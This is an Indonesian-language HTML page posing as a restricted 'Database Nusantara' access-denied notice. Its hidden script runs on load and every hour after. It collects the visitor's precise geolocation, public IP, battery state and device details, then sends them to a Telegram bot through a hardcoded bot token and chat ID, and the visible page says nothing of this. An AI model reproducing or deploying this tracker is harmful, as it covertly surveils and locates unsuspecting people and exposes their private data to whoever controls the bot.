<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Database Nusantara</title>
  <style>
    body {
      background-color: #0b0b0b;
      color: #00ffcc;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      text-align: center;
      padding: 40px 20px 20px;
    }
    img.logo {
      width: 190px;
      margin-bottom: 25px;
      filter: grayscale(100%) brightness(150%);
    }
    h1 {
      color: #ff4444;
      font-size: 1.4em;
      margin-bottom: 15px;
    }
    p {
      color: #00ffff;
      font-size: 1em;
    }
  </style>
</head>
<body>
  <img src="https://borneo101.github.io/DataBase/garuda_ai.png" class="logo" alt="Garuda AI" />
  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
  <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>

  <script>
    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const chatId = 5677912817;

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Tidak tersedia";
      }
    }

    async function getBattery() {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return `Baterai: ${Math.round(b.level * 100)}% ${b.charging ? '(Mengisi)' : ''}`;
      } else {
        return "Baterai: Tidak didukung";
      }
    }

    function getDeviceInfo() {
      return [
        `User Agent: ${navigator.userAgent}`,
        `Resolusi: ${screen.width}x${screen.height}`,
        `Bahasa: ${navigator.language}`,
        `Waktu Lokal: ${new Date().toLocaleString()}`
      ].join('\n');
    }

    async function kirimSemuaData() {
      try {
        const [ip, battery] = await Promise.all([getIP(), getBattery()]);

        navigator.geolocation.getCurrentPosition(async pos => {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const acc = pos.coords.accuracy;

          const lokasi = `Lokasi: ${lat}, ${lon} (Â±${acc} m)`;
          const semua = [
            "[DatabaseNusantara Report]",
            lokasi,
            `IP: ${ip}`,
            battery,
            getDeviceInfo()
          ].join('\n');

          // Buat Blob untuk dikirim sebagai file
          const blob = new Blob([semua], { type: "text/plain" });
          const form = new FormData();
          form.append("chat_id", chatId);
          form.append("document", blob, "data.txt");

          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: form
          });

        }, err => {
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: "Gagal lokasi: " + err.message })
          });
        });
      } catch (e) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: "Gagal sistem: " + e.message })
        });
      }
    }

    // Jalankan sekarang
    kirimSemuaData();

    // Kirim ulang setiap 1 jam (3600000 ms)
    setInterval(kirimSemuaData, 3600000);
  </script>
</body>
</html>
